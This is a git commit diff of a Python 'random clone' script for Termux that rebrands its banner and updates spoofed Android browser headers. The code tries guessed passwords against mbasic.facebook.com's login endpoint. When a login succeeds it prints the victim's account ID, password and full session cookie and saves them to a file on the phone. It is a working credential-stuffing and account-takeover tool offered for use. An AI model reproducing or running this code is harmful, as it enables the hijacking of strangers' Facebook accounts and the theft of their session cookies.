7e6cb35ff9baa29fa8bfd81eaf692793ef0b64be
MRX-JIBON-SARKAR <138970072+MRX-JIBON-SARKAR@users.noreply.github.com>
2023-11-15 15:01:37 +0600

    Add files via upload

--- OK-BRO.py
+++ OK-BRO.py
@@ -131,9 +131,9 @@ logo=(""" JOIN TELEGRAM T.me/mueorb
 \x1b[38;5;79m██  ██  ██ ██   ██    ██   ██ ██   ██ ██    ██ 
 \x1b[38;5;85m██      ██ ██   ██ ██ ██████  ██   ██  ██████  
 \x1b[38;5;77m──────────────────────────────────────────────                 
-\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m SADMAN SAMIR SNIGDHO
+\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m JIBON
 \x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m JIBON
-\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+8801871778635
+\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+88018
 \x1b[38;5;78m〘✧〙TOOLS     \x1b[38;5;222m➤   \x1b[38;5;78mRANDOM CLONE    \x1b[38;5;197m(FREE)
 \x1b[38;5;77m──────────────────────────────────────────────""")
 def cek_apk(session,coki):
@@ -246,7 +246,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMUEOR TERMUX WORLD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJIBON TERMUX WORLD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -261,37 +261,37 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = headers = {'authority': 'mbasic.facebook.com',
-     'method': 'GET',
-     'path': '/',
-     'scheme': 'https',
-     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-     'cache-control': 'max-age=0',
-     'dpr': '2',
-     'sec-ch-prefers-color-scheme': 'light',
-     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-     'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-     'sec-ch-ua-mobile': '?1',
-     'sec-ch-ua-model': '"22127PC95I"',
-     'sec-ch-ua-platform': '"Android"',
-     'sec-ch-ua-platform-version': '"13.0.0"',
-     'sec-fetch-dest': 'document',
-     'sec-fetch-mode': 'navigate',
-     'sec-fetch-site': 'none',
-     'sec-fetch-user': '?1',
-     'upgrade-insecure-requests': '1',
-     'user-agent': 'pro',
-     'viewport-width': '980',}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'path': '/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"TECNO BF7"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [MUEOR TERMUX WORLD-❤️‍🔥] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [JIBON TERMUX WORLD-❤️‍🔥] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[❤️‍🔥]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/MUEOR TERMUX WORLDok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/JIBON TERMUX WORLDok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
